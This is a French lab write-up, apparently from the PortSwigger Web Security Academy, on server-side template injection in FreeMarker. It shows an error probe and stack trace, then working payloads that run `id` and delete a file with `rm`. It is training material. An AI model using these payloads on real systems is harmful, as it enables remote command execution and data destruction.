# Lab

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation

## Payload

En se connectant avec le compte de content-manager, on a la possibilité de modifier le template d'une page.

Si on injecte `${foobar}`, on obtient une erreur. 

```
FreeMarker template error (DEBUG mode; use RETHROW in production!):
The following has evaluated to null or missing:
==&gt; foobar  [in template &quot;freemarker&quot; at line 1, column 3]

----
Tip: If the failing expression is known to legally refer to something that&apos;s sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)??
----

----
FTL stack trace (&quot;~&quot; means nesting-related):
	- Failed at: ${foobar}  [in template &quot;freemarker&quot; at line 1, column 1]
----

Java stack trace (for programmers):
----
freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...]
	at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134)
	at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479)
	at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401)
	at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370)
	at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100)
	at freemarker.core.DollarVariable.accept(DollarVariable.java:63)
	at freemarker.core.Environment.visit(Environment.java:331)
	at freemarker.core.Environment.visit(Environment.java:337)
	at freemarker.core.Environment.process(Environment.java:310)
	at freemarker.template.Template.process(Template.java:383)
	at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58)
	at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42)
	at lab.actions.common.Action.act(Action.java:57)
	at lab.actions.common.Action.run(Action.java:39)
	at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
```

On est donc sur un template Java FreeMarker.

`${"freemarker.template.utility.Execute"?new()("id")}` nous donne `uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)`.

Pour supprimer le fichier `morale.txt` : `${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`.